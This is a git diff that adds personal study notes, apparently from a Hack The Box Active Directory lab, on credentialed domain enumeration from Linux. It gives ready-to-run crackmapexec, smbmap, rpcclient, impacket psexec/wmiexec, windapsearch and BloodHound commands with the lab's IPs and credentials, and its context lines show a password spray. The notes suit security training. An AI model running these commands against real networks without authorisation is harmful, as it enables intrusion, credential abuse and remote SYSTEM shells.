@@ -127,3 +127,63 @@ PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 ```
 
+## Credential Enumeration from Linux
+for this process we need atleast one valid credential to any account or service in the domain
+### Crackmapexec
+using SMB we can list users, shares, groups, loggedon-users and even look through the shares
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
+```
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+```
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+the results from the spider_plus module will be stored in /tmp/spider_plus/<ipadd>
+### SMBMap
+credentialed enumeration
+```
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+recursively listing directories
+```
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+### rpcclient
+as there is an SMB NULL session in this case unauthenticated enumeration can be performed using rpcclient. authenticated enumeration is also possible.
+```
+rpcclient -U "" -N 172.16.5.5
+```
+then we can list users and their RIDs. This will be helpful later. We will even be able create new users, groups etc.
+### Impacket Toolkit
+focusing on wmiexec.py and psexec.py
+ The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
+```
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+```
+wmiexec.py. It is a stealthier approach than psexec.py. But it is not fully interactive and creates a new instance for every command. And it doesn't give SYSTEM32
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+```
+### Windapsearch
+domain admins
+```
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+privileged users
+```
+ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+### Bloodhound
+```
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+```
+zip the results and upload to the bloodhound gui to run queries on the data.
+
